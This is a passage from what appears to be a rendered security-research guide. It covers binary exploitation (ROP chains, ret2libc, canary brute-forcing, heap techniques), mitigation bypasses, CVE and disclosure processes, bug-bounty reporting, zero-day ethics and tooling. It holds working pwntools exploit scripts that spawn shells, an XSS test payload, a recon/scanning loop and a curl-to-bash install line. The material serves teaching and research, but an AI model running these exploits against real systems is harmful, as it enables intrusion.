ROPgadget\nROPgadget --binary ./vulnerable_binary > gadgets.txt\n\n# Search for specific gadgets\nROPgadget --binary ./vulnerable_binary --only "pop|ret"\n\n# Ropper\nropper --file ./vulnerable_binary --search "pop rdi"\n\n# radare2\nr2 -A ./vulnerable_binary\n> /R pop rdi\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:'Basic ROP chain (call system("/bin/sh")):'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"from pwn import *\n\n# Binary info\nelf = ELF('./vulnerable_binary')\nrop = ROP(elf)\n\n# Gadgets\npop_rdi = 0x401234  # pop rdi; ret\nbin_sh = 0x402000   # Address of \"/bin/sh\" string\nsystem_addr = elf.plt['system']\n\n# Build ROP chain\npayload = b\"A\" * offset\npayload += p64(pop_rdi)      # pop rdi; ret\npayload += p64(bin_sh)       # rdi = \"/bin/sh\"\npayload += p64(system_addr)  # call system\n\n# Send exploit\np = process('./vulnerable_binary')\np.sendline(payload)\np.interactive()\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"ret2libc attack:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"from pwn import *\n\n# Leak libc address\nelf = ELF('./vulnerable_binary')\nrop = ROP(elf)\n\n# Stage 1: Leak libc address\npop_rdi = 0x401234\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nmain_addr = elf.symbols['main']\n\npayload = b\"A\" * offset\npayload += p64(pop_rdi)\npayload += p64(puts_got)      # puts(puts@GOT) \u2192 leak address\npayload += p64(puts_plt)\npayload += p64(main_addr)     # Return to main\n\np = process('./vulnerable_binary')\np.sendline(payload)\n\n# Receive leaked address\np.recvuntil(b\"Input: \")\nleaked_puts = u64(p.recvline().strip().ljust(8, b'\\x00'))\nlog.info(f\"Leaked puts: {hex(leaked_puts)}\")\n\n# Calculate libc base\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nlibc.address = leaked_puts - libc.symbols['puts']\nlog.info(f\"Libc base: {hex(libc.address)}\")\n\n# Stage 2: Call system with libc address\nbin_sh = next(libc.search(b'/bin/sh'))\nsystem_addr = libc.symbols['system']\n\npayload2 = b\"A\" * offset\npayload2 += p64(pop_rdi)\npayload2 += p64(bin_sh)\npayload2 += p64(system_addr)\n\np.sendline(payload2)\np.interactive()\n"})}),"\n",(0,r.jsx)(n.h3,{id:"heap-exploitation-techniques",children:"Heap Exploitation Techniques"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"House of Force:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"# Exploit malloc() by corrupting top chunk size\n# 1. Overflow into top chunk, set size to -1 (0xffffffffffffffff)\n# 2. Calculate offset to target address\n# 3. Allocate large chunk to move top chunk to target\n# 4. Next allocation writes to target address\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Fastbin dup:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"# Exploit double-free in fastbins\n# 1. Allocate three chunks: A, B, C\n# 2. Free A, B, A (double-free A)\n# 3. Fastbin: A \u2192 B \u2192 A (circular)\n# 4. Allocate and control A again\n# 5. Overwrite fd pointer of A to target address\n# 6. Allocate until target is returned\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Tcache poisoning:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"# Similar to fastbin dup but with tcache\n# Tcache has less security checks\n# 1. Double-free into tcache\n# 2. Overwrite next pointer\n# 3. Allocate to get arbitrary write\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"exploit-mitigations--bypasses",children:"Exploit Mitigations & Bypasses"}),"\n",(0,r.jsx)(n.h3,{id:"stack-canaries",children:"Stack Canaries"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Detection:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"checksec --file=./binary\n# Output:\n# Canary: Canary found\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Bypass techniques:"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Information leak:"})," Leak canary value before overwriting"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Brute-force:"})," Single-byte brute-force on 64-bit (256 attempts)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Fork without re-randomization:"})," Some daemons don't regenerate canary"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Brute-force example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\ncanary = b\'\'\n\n# Brute-force one byte at a time\nfor i in range(8):\n    for byte_val in range(256):\n        p = process(\'./vulnerable_binary\')\n\n        payload = b"A" * offset\n        payload += canary + bytes([byte_val])\n\n        p.sendline(payload)\n        response = p.recvall()\n\n        if b"stack smashing detected" not in response:\n            canary += bytes([byte_val])\n            log.info(f"Canary byte {i}: {hex(byte_val)}")\n            break\n\n        p.close()\n\nlog.success(f"Full canary: {canary.hex()}")\n'})}),"\n",(0,r.jsx)(n.h3,{id:"depnx-data-execution-prevention",children:"DEP/NX (Data Execution Prevention)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Detection:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"checksec --file=./binary\n# Output:\n# NX: NX enabled\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Bypass:"})," Use ROP (Return-Oriented Programming) - execute existing code instead of injecting shellcode."]}),"\n",(0,r.jsx)(n.h3,{id:"aslr-address-space-layout-randomization",children:"ASLR (Address Space Layout Randomization)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Check if enabled:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Linux\ncat /proc/sys/kernel/randomize_va_space\n# 0 = Disabled\n# 1 = Partial (stack/heap/libraries)\n# 2 = Full (includes PIE)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Bypass techniques:"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Information leak:"})," Leak address to calculate base"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Brute-force:"})," On 32-bit systems (limited entropy)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Partial overwrite:"})," Overwrite only lower bytes (address space reuse)"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Information leak bypass:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"# Leak stack/libc address\n# Then calculate base and build exploit\n"})}),"\n",(0,r.jsx)(n.h3,{id:"pie-position-independent-executable",children:"PIE (Position Independent Executable)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Detection:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"checksec --file=./binary\n# Output:\n# PIE: PIE enabled\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Bypass:"})," Leak binary address to calculate base, similar to ASLR bypass."]}),"\n",(0,r.jsx)(n.h3,{id:"relro-relocation-read-only",children:"RELRO (Relocation Read-Only)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Types:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Partial RELRO:"})," GOT is writable"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Full RELRO:"})," GOT is read-only after initialization"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Detection:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"checksec --file=./binary\n# Output:\n# RELRO: Full RELRO\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Partial RELRO bypass:"})," Overwrite GOT entries to redirect execution."]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Full RELRO:"})," Must find alternative targets (vtables, function pointers)."]}),"\n",(0,r.jsx)(n.h3,{id:"control-flow-integrity-cfi",children:"Control Flow Integrity (CFI)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Bypass techniques:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Find valid CFI targets that can be abused"}),"\n",(0,r.jsx)(n.li,{children:"Exploit data-only attacks (no control flow hijacking needed)"}),"\n",(0,r.jsx)(n.li,{children:"Use return-oriented programming within valid targets"}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"cve-process--disclosure",children:"CVE Process & Disclosure"}),"\n",(0,r.jsx)(n.h3,{id:"cve-request-process",children:"CVE Request Process"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Determine if vulnerability deserves CVE:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Affects security"}),"\n",(0,r.jsx)(n.li,{children:"Affects multiple users"}),"\n",(0,r.jsx)(n.li,{children:"Not already assigned CVE"}),"\n",(0,r.jsx)(n.li,{children:"Fixed or in process of being fixed"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Request CVE from CNA (CVE Numbering Authority):"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"MITRE (general software):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Email: cve-assign@mitre.org\n\nSubject: CVE Request - [Product Name] [Vulnerability Type]\n\nBody:\nProduct: [Name and version]\nVendor: [Vendor name]\nVulnerability Type: [Buffer overflow, XSS, etc.]\nAttack Vector: [Remote, local, etc.]\nImpact: [Code execution, DoS, info disclosure]\nAffected Versions: [Specific versions]\nFixed Version: [Version with fix]\n\nDescription:\n[Detailed technical description]\n\nProof of Concept:\n[Minimal PoC to demonstrate]\n\nDisclosure Timeline:\nReported to vendor: YYYY-MM-DD\nVendor response: YYYY-MM-DD\nFix available: YYYY-MM-DD\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"GitHub Security Advisories (for GitHub projects):"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Navigate to repository \u2192 Security \u2192 Advisories"}),"\n",(0,r.jsx)(n.li,{children:'Click "New draft security advisory"'}),"\n",(0,r.jsx)(n.li,{children:"Fill in details (affected versions, severity, description)"}),"\n",(0,r.jsx)(n.li,{children:"Request CVE automatically"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Receive CVE ID:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Format: CVE-YYYY-NNNNN (e.g., CVE-2024-12345)"}),"\n",(0,r.jsx)(n.li,{children:"Reserved before public disclosure"}),"\n",(0,r.jsx)(n.li,{children:"Published after disclosure"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. CVSS Scoring:"})}),"\n",(0,r.jsxs)(n.p,{children:["Calculate severity using CVSS calculator:\n",(0,r.jsx)(n.a,{href:"https://www.first.org/cvss/calculator/3.1",children:"https://www.first.org/cvss/calculator/3.1"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Example scoring:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Attack Vector: Network (AV",":N",")"]}),"\n",(0,r.jsxs)(n.li,{children:["Attack Complexity: Low (AC",":L",")"]}),"\n",(0,r.jsxs)(n.li,{children:["Privileges Required: None (PR",":N",")"]}),"\n",(0,r.jsxs)(n.li,{children:["User Interaction: None (UI",":N",")"]}),"\n",(0,r.jsxs)(n.li,{children:["Scope: Unchanged (S",":U",")"]}),"\n",(0,r.jsxs)(n.li,{children:["Confidentiality: High (C",":H",")"]}),"\n",(0,r.jsxs)(n.li,{children:["Integrity: High (I",":H",")"]}),"\n",(0,r.jsxs)(n.li,{children:["Availability: High (A",":H",")"]}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Result:"})," CVSS:3.1/AV",":N","/AC",":L","/PR",":N","/UI",":N","/S",":U","/C",":H","/I",":H","/A",":H"," (Critical 9.8)"]}),"\n",(0,r.jsx)(n.h3,{id:"responsible-disclosure-timeline",children:"Responsible Disclosure Timeline"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Standard 90-day disclosure:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Day 0:   Discover vulnerability\nDay 1-3: Verify and create PoC\nDay 5:   Report to vendor (encrypted email preferred)\nDay 7:   Vendor acknowledges receipt\nDay 30:  Vendor provides fix timeline\nDay 60:  Vendor releases patch (if ready)\nDay 90:  Public disclosure (coordinated)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Accelerated disclosure (active exploitation):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Day 0:  Discover 0-day being exploited in wild\nDay 1:  Immediate notification to vendor\nDay 7:  Public disclosure if no patch\n        (users need to protect themselves)\n"})}),"\n",(0,r.jsx)(n.h3,{id:"writing-security-advisories",children:"Writing Security Advisories"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Advisory template:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-markdown",children:"# Security Advisory: [Product] [Vulnerability Type]\n\n## Summary\n[One-paragraph description of vulnerability and impact]\n\n## CVE ID\nCVE-YYYY-NNNNN\n\n## Severity\nCritical / High / Medium / Low (CVSS X.X)\n\n## Affected Versions\n- Product X.X.X through X.X.X\n\n## Fixed Versions\n- Product X.X.X and later\n\n## Vulnerability Details\n[Technical description of vulnerability]\n\n### Vulnerability Type\n[Buffer overflow, SQL injection, etc.]\n\n### Attack Vector\n[Remote/Local, network/adjacent/local]\n\n### Attack Complexity\n[Low/High - prerequisites for exploitation]\n\n## Proof of Concept\n[Minimal code to demonstrate vulnerability]\n\n## Impact\n- Remote code execution\n- Authentication bypass\n- Information disclosure\n- Denial of service\n\n## Mitigation\n1. Upgrade to version X.X.X or later\n2. If upgrade not possible:\n   - Apply workaround: [description]\n   - Disable feature: [description]\n\n## Timeline\n- YYYY-MM-DD: Vulnerability discovered\n- YYYY-MM-DD: Reported to vendor\n- YYYY-MM-DD: Vendor confirmed issue\n- YYYY-MM-DD: CVE assigned\n- YYYY-MM-DD: Patch released\n- YYYY-MM-DD: Public disclosure\n\n## Credits\nDiscovered by: [Your Name / Organization]\n\n## References\n- [Link to vendor advisory]\n- [Link to patch]\n- [Link to CVE entry]\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"bug-bounty-programs",children:"Bug Bounty Programs"}),"\n",(0,r.jsx)(n.h3,{id:"top-bug-bounty-platforms",children:"Top Bug Bounty Platforms"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Platform"}),(0,r.jsx)(n.th,{children:"Focus"}),(0,r.jsx)(n.th,{children:"Website"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"HackerOne"}),(0,r.jsx)(n.td,{children:"General"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://www.hackerone.com/",children:"https://www.hackerone.com/"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Bugcrowd"}),(0,r.jsx)(n.td,{children:"General"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://www.bugcrowd.com/",children:"https://www.bugcrowd.com/"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Synack"}),(0,r.jsx)(n.td,{children:"Private programs"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://www.synack.com/",children:"https://www.synack.com/"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Intigriti"}),(0,r.jsx)(n.td,{children:"European companies"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://www.intigriti.com/",children:"https://www.intigriti.com/"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"YesWeHack"}),(0,r.jsx)(n.td,{children:"European companies"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://www.yeswehack.com/",children:"https://www.yeswehack.com/"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Google VRP"}),(0,r.jsx)(n.td,{children:"Google products"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://bughunters.google.com/",children:"https://bughunters.google.com/"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Microsoft MSRC"}),(0,r.jsx)(n.td,{children:"Microsoft products"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://www.microsoft.com/en-us/msrc/bounty",children:"https://www.microsoft.com/en-us/msrc/bounty"})})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"bug-bounty-best-practices",children:"Bug Bounty Best Practices"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Read the scope carefully:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"\u2705 In Scope:\n- *.example.com\n- mobile.example.com\n- api.example.com\n\n\u274c Out of Scope:\n- test.example.com\n- blog.example.com (third-party)\n- Physical security testing\n- Social engineering\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Understand severity ratings:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Critical ($$$$$):\n- Remote code execution\n- Authentication bypass\n- SQL injection with data access\n- SSRF with cloud metadata access\n\nHigh ($$$$):\n- Stored XSS\n- Privilege escalation\n- IDOR with PII access\n\nMedium ($$$):\n- Reflected XSS\n- CSRF on sensitive actions\n\nLow ($$):\n- Self-XSS\n- Clickjacking without impact\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Write quality reports:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Good report structure:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-markdown",children:"## Summary\n[One sentence describing vulnerability and impact]\n\n## Description\n[Detailed explanation of what the vulnerability is]\n\n## Steps to Reproduce\n1. Navigate to https://example.com/vulnerable-page\n2. Enter payload in input field: <script>alert(1)<\/script>\n3. Submit form\n4. Observe XSS execution\n\n## Proof of Concept\n[Screenshot/video demonstrating vulnerability]\n\n[Code snippet if applicable]\n\n## Impact\nAn attacker can:\n- Steal user session cookies\n- Perform actions as victim user\n- Deface the website\n\n## Remediation\n1. Sanitize user input before displaying\n2. Implement Content-Security-Policy header\n3. Use httpOnly and secure flags on cookies\n\n## Supporting Material\n- Browser: Chrome 120.0.6099.109\n- Operating System: Ubuntu 22.04\n- Video: [link to PoC video]\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Automation for efficiency:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Subdomain enumeration\nsubfinder -d target.com | httpx | nuclei\n\n# Automated scanning\nnuclei -l targets.txt -t ~/nuclei-templates/\n\n# Continuous monitoring\nwhile true; do\n    subfinder -d target.com | httpx -silent | \\\n    nuclei -silent -t ~/nuclei-templates/cves/ | \\\n    notify -silent\n    sleep 3600\ndone\n"})}),"\n",(0,r.jsx)(n.h3,{id:"common-bounty-mistakes-to-avoid",children:"Common Bounty Mistakes to Avoid"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u274c Don't:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Test out-of-scope assets"}),"\n",(0,r.jsx)(n.li,{children:"Perform denial-of-service attacks"}),"\n",(0,r.jsx)(n.li,{children:"Access other users' data (beyond PoC)"}),"\n",(0,r.jsx)(n.li,{children:"Spam duplicate reports"}),"\n",(0,r.jsx)(n.li,{children:"Demand specific bounty amounts"}),"\n",(0,r.jsx)(n.li,{children:"Share vulnerability publicly before resolution"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u2705 Do:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Follow scope and rules"}),"\n",(0,r.jsx)(n.li,{children:"Provide clear reproduction steps"}),"\n",(0,r.jsx)(n.li,{children:"Include impact analysis"}),"\n",(0,r.jsx)(n.li,{children:"Be professional and patient"}),"\n",(0,r.jsx)(n.li,{children:"Help vendor understand and fix issue"}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"0-day-research-ethics",children:"0-Day Research Ethics"}),"\n",(0,r.jsx)(n.h3,{id:"responsible-0-day-research",children:"Responsible 0-Day Research"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Ethical guidelines:"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Discovery:"})," Finding unknown vulnerabilities is legitimate security research"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Disclosure:"})," Report to vendor for patching before public disclosure"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"No harm:"})," Don't exploit vulnerability against real users"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"No sale:"})," Don't sell 0-days to malicious actors"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Protect users:"})," Prioritize user safety over researcher fame"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Unethical practices:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u274c Selling 0-days to offensive contractors without disclosure to vendor"}),"\n",(0,r.jsx)(n.li,{children:"\u274c Exploiting 0-days for financial gain"}),"\n",(0,r.jsx)(n.li,{children:"\u274c Releasing 0-days publicly without vendor notification"}),"\n",(0,r.jsx)(n.li,{children:"\u274c Threatening vendors for payment"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Gray areas (debatable):"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u26a0\ufe0f Coordinating with government agencies for defensive purposes"}),"\n",(0,r.jsx)(n.li,{children:"\u26a0\ufe0f Disclosing after vendor ignores repeated reports (last resort)"}),"\n",(0,r.jsx)(n.li,{children:"\u26a0\ufe0f Participating in government offensive programs (legal but controversial)"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"0-day-market-economics",children:"0-Day Market Economics"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Legitimate acquisition:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Vendors:"})," Purchase to fix their own products"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Governments:"})," Offensive/defensive cyber capabilities (controversial)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Bug bounties:"})," Ethical acquisition with public disclosure"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Illegitimate market:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Criminal groups purchasing for financial cybercrime"}),"\n",(0,r.jsx)(n.li,{children:"State-sponsored APTs for espionage/warfare"}),"\n",(0,r.jsx)(n.li,{children:"Zero-day brokers selling to highest bidder"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Pricing (rough estimates):"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"iOS/Android remote code execution: $500K - $2M"}),"\n",(0,r.jsx)(n.li,{children:"Windows kernel exploit: $200K - $500K"}),"\n",(0,r.jsx)(n.li,{children:"Chrome/Firefox RCE: $100K - $300K"}),"\n",(0,r.jsx)(n.li,{children:"Popular web app 0-day: $5K - $50K"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Note:"})," Bug bounties typically pay far less than gray market, but are ethical and legal."]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"tools-reference",children:"Tools Reference"}),"\n",(0,r.jsx)(n.h3,{id:"essential-tools",children:"Essential Tools"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Tool"}),(0,r.jsx)(n.th,{children:"Purpose"}),(0,r.jsx)(n.th,{children:"Installation"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"GDB + GEF"}),(0,r.jsx)(n.td,{children:"Debugging"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.code,{children:'bash -c "$(curl -fsSL https://gef.blah.cat/sh)"'})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"pwntools"}),(0,r.jsx)(n.td,{children:"Exploit development"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.code,{children:"pip install pwntools"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"AFL++"}),(0,r.jsx)(n.td,{children:"Fuzzing"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.code,{children:"sudo apt install afl++"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"radare2"}),(0,r.jsx)(n.td,{children:"Binary analysis"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.code,{children:"sudo apt install radare2"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Ghidra"}),(0,r.jsx)(n.td,{children:"Reverse engineering"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://ghidra-sre.org/",children:"https://ghidra-sre.org/"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"IDA Pro"}),(0,r.jsx)(n.td,{children:"Disassembler"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://hex-rays.com/ida-pro/",children:"https://hex-rays.com/ida-pro/"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Binary Ninja"}),(0,r.jsx)(n.td,{children:"Binary analysis"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://binary.ninja/",children:"https://binary.ninja/"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"checksec"}),(0,r.jsx)(n.td,{children:"Security check"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.code,{children:"sudo apt install checksec"})})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"fuzzing-tools",children:"Fuzzing 